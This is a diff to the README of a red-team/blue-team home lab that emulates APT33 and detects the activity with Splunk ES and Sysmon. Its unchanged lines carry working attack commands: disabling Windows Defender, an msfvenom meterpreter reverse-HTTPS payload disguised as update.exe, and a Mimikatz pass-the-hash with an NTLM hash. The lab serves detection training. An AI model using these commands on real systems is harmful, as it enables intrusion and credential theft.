@@ -76,7 +76,7 @@ The lab is built on VMware/VirtualBox and segmented into three network zones con
 
 ## 3. Threat Intelligence — Who is APT33?
 
-APT33 is an Iranian cyber espionage group that has been active since at least 2013. Mandiant (formerly FireEye) first publicly attributed the group in 2017. The group primarily targets organizations in the **aerospace, aviation, energy, and petrochemical** sectors — mainly in the United States, Saudi Arabia, and South Korea.
+APT33 is an Iranian cyber espionage group that has been active since at least 2013. Mandiant (formerly FireEye) first publicly attributed the group in 2017. The group primarily targets organizations in the **aerospace, aviation, energy, and petrochemical** sectors.
 
 ### Known Malware Arsenal
 
@@ -106,7 +106,7 @@ Spear-Phishing → PowerShell Execution → Persistence → Defense Evasion
 
 Atomic Red Team is installed directly on the Victim Machine. This represents the post-compromise phase — simulating all techniques an attacker would execute after gaining an initial foothold.
 
-**Step 1 — Disable Windows Defender (simulates AV evasion)**
+**Step 1 — Disable Windows Defender**
 
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -120,10 +120,10 @@ Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
 **Step 3 — Verify Installation**
 
 
-**Step 4 — Import the module (required every session)**
+**Step 4 — Import the module**
 
 
-### 4.2 Installing Sysmon — On Victim Machine and Domain Controller
+### 4.2 Installing Sysmon : On Victim Machine and Domain Controller
 
 Sysmon is critical. Without it, Splunk ES cannot capture process creation, network connections, or registry modifications that ART tests generate.
 
@@ -154,14 +154,12 @@ exploit -j
 ### Step 2 — Generate the Phishing Payload
 
 ```bash
-# Generate HTTPS reverse shell — mimics APT33 TURNEDUP dropper behavior
 msfvenom -p windows/x64/meterpreter/reverse_https \
   LHOST=192.168.16.130 \
   LPORT=443 \
   -f exe \
   -o /var/www/html/update.exe
 
-# Host it on Apache (simulates attacker-controlled infrastructure)
 service apache2 start
 ```
 
@@ -337,7 +335,6 @@ With the NTLM hash of user `pc` extracted, we perform **Pass-the-Hash** to move 
 ### 11.1 Pass-the-Hash via Mimikatz
 
 ```cmd
-# Still inside Mimikatz on the Victim Machine:
 privilege::debug
 
 sekurlsa::pth /user:pc /domain:NIGHTBARON /ntlm:a47cc8e930890eb79fb768a519cd3e57 /run:cmd.exe
@@ -396,8 +393,6 @@ Invoke-AtomicTest T1053.005 -TestNumbers 4 -Cleanup
 Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup
 Invoke-AtomicTest T1003.001 -TestNumbers 2 -Cleanup
 ```
-
----
 
 ## 13. Detection — Splunk ES & Sysmon Analysis
 
@@ -505,6 +500,8 @@ These registry modifications allow malicious payloads to survive system reboots 
 
 <img width="1561" height="501" alt="Exec of T1070 001 Clear Logs" src="https://github.com/user-attachments/assets/3f24fcf6-52e2-48b4-8d35-093202731084" />
 
+
+The above screenshot shows three log clearance events detected, all three events occurred within a one‑minute window. This rapid succession of log deletions is highly indicative of adversary behavior attempting to hinder forensic analysis and cover tracks after executing other malicious actions.
 
 
 ## 14. MITRE ATT&CK Coverage Map
